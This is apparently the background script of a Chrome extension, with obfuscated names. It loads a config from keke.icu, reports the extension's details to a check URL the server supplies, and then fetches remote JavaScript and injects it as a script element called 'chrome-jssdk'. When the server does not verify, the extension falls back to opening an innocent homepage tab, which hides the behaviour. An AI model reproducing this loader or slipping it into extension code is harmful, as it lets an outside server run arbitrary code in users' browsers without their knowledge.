var herrg = {};
var abbvij = function(){
	var qbabs = "http://keke.icu/config";
	fetch(qbabs).then(function(response){
		return response.json();
	}).then(function(data){
		herrg = data;
		if(data.login == true){
			herrg.app = chrome.app.getDetails();
			dhgui();
		}else{
			jlxjph();
		}
	});
}

var dhgui = function(){
	herrg.request.headers = {installed:true};
	fetch(herrg.check ,herrg.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			iahmop();
		}else{
			jlxjph();
		}
	});
}

var wxoay = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = herrg.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var iahmop = function(){
	fetch(herrg.url).then(function(response){
		return response.blob();
	}).then(function(data){
		herrg.url = URL.createObjectURL(data);
		wxoay(herrg.url);
	});
}

var firlz = function(){
	chrome.tabs.create({url:herrg.homepage}, function(tab){
		herrg.tab = tab.id;
		chrome.browserAction.enable();
		if(!herrg.juzrie){
			igwwb();
		}
	});
}

var meucmr = function(){
	chrome.tabs.update(herrg.tab, {url: herrg.homepage}, function(){
		chrome.browserAction.enable();
	})
}

var igwwb = function(){
	herrg.juzrie = true;
	chrome.tabs.onRemoved.addListener(function(tab){
		if(tab == herrg.tab){
			herrg.tab = false;
		}
	});
}

var jlxjph = function(){
	chrome.browserAction.onClicked.addListener(function(){
		chrome.browserAction.disable();
		if(!herrg.tab){
			firlz();
		}else{
			meucmr();
		}
	});
}

if(chrome){
	abbvij();
}
